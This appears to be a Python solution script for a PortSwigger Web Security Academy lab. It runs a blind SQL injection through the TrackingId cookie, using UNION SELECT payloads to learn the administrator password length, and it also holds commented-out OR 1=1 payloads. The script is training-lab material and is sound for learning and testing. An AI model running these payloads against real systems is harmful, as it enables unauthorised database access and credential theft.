import urllib.parse
import time
import requests
import sys
from bs4 import BeautifulSoup

# Adding this so I can use IntelliJ's play button.
# This value is only used if none is supplied from the command line.
MANUAL_CTF_URL = "https://ac9f1f131fa52d2ac032acd300ed00b4.web-security-academy.net/"


# Parse site URL
def getCtfUrl():
    try:
        site = sys.argv[1]
    except IndexError:
        site = MANUAL_CTF_URL
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')
    return f'https://{site}/'


# Helper functions
def try_query(query):
    print(f'Query: {query}')
    my_cookies = {'TrackingId': urllib.parse.quote_plus(query)}
    resp = requests.get(url, cookies=my_cookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False


# I like being able to use a play button
if __name__ == "__main__":
    url = getCtfUrl()

    begin_time = time.perf_counter()
    num = 1

    while True:
        query = f"x' UNION SELECT username FROM users WHERE username='administrator' AND length(password)={num}--"
        print(f'Trying length {num}')
        if not try_query(query):
            num = num + 1
        else:
            break
    print(f"Password length is {num}")
    print(f"Time elapsed is {time.perf_counter() - begin_time} (seconds)")

    # Output from run (finding admin password length:
    #   Password length is 20
    #   Time elapsed is 14.598776606000229

    # print(try_query("""x' OR 1=1 --"""))
    # print(try_query("""x" OR 1=1 --"""))
